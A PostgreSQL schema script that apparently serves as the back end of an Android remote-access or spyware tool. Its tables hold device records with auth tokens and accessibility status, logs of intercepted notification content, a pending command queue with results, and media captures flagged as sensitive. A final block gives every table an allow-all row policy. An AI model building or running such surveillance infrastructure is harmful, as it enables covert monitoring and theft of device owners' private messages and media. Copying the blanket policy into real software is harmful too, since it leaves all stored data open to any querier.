DROP TABLE IF EXISTS notification_logs CASCADE;
DROP TABLE IF EXISTS media_captures CASCADE;
DROP TABLE IF EXISTS service_tasks CASCADE;
DROP TABLE IF EXISTS client_info CASCADE;
DROP TABLE IF EXISTS admin_access CASCADE;

CREATE TABLE client_info (
    client_serial TEXT PRIMARY KEY,
    model_name TEXT,
    android_version TEXT,
    auth_token TEXT,
    battery_level INTEGER,
    is_accessibility_enabled BOOLEAN DEFAULT false,
    created_at TIMESTAMPTZ DEFAULT now(),
    last_seen TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE notification_logs (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT NOT NULL REFERENCES client_info(client_serial) ON DELETE CASCADE,
    package_name TEXT,
    title TEXT,
    content TEXT,
    created_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE service_tasks (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT NOT NULL REFERENCES client_info(client_serial) ON DELETE CASCADE,
    command_type TEXT NOT NULL,
    params JSONB DEFAULT '{}',
    status TEXT DEFAULT 'pending',
    result_data TEXT,
    created_at TIMESTAMPTZ DEFAULT now(),
    updated_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE media_captures (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT NOT NULL REFERENCES client_info(client_serial) ON DELETE CASCADE,
    file_url TEXT,
    is_sensitive BOOLEAN DEFAULT false,
    captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_client_last_seen ON client_info(last_seen);
CREATE INDEX idx_notif_device ON notification_logs(device_id);
CREATE INDEX idx_tasks_pending ON service_tasks(status) WHERE status = 'pending';

ALTER TABLE client_info ENABLE ROW LEVEL SECURITY;
ALTER TABLE notification_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE service_tasks ENABLE ROW LEVEL SECURITY;
ALTER TABLE media_captures ENABLE ROW LEVEL SECURITY;

DO $$
DECLARE
    tbl text;
BEGIN
    FOR tbl IN (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public') LOOP
        EXECUTE format('DROP POLICY IF EXISTS "Service Role Access" ON %I', tbl);
        EXECUTE format('CREATE POLICY "Service Role Access" ON %I FOR ALL USING (true)', tbl);
    END LOOP;
END $$;